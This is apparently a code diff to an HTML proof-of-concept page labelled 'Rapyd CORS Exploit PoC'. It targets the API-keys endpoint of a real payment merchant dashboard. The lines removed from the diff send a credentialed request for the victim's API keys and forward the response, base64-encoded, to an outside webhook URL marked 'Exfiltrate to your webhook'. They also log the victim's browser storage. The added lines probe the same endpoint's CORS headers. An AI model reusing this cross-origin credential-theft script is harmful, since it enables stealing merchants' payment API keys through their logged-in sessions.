@@ -4,23 +4,35 @@
     <h2>💣 Rapyd CORS Exploit PoC</h2>
     
     <script>
+async function getAllowedHeaders(url) {
+  try {
+    const response = await fetch(url, {
+      method: 'OPTIONS',
+      headers: {
+        'Accept': 'application/json',
+        // Include other headers if needed for CORS
+      }
+    });
+    
+    if (response.ok) {
+      const allowedHeaders = response.headers.get('Access-Control-Allow-Headers');
+      console.log('Allowed Headers:', allowedHeaders);
+      return allowedHeaders ? allowedHeaders.split(',') : [];
+    } else {
+      console.error('Failed to get OPTIONS response');
+      return [];
+    }
+  } catch (error) {
+    console.error('Error making OPTIONS request:', error);
+    return [];
+  }
+}
 
-      fetch("https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys", {
-        method: "GET",
-        credentials: "include",
-      })
-        .then(res => res.text())
-.then(data => {
- fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e?data="+ btoa(data), {
-            method: "POST",
-            body: data
-          });
-          // Exfiltrate to your webhook
-          
-        })
-        .catch(err => console.error("Exploit failed:", err));
-      console.log(localStorage)
-      console.log(sessionStorage)
+// Usage
+const apiUrl = 'https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys';
+getAllowedHeaders(apiUrl).then(headers => {
+  console.log('Allowed headers array:', headers);
+});
     </script>
   </body>
 </html>
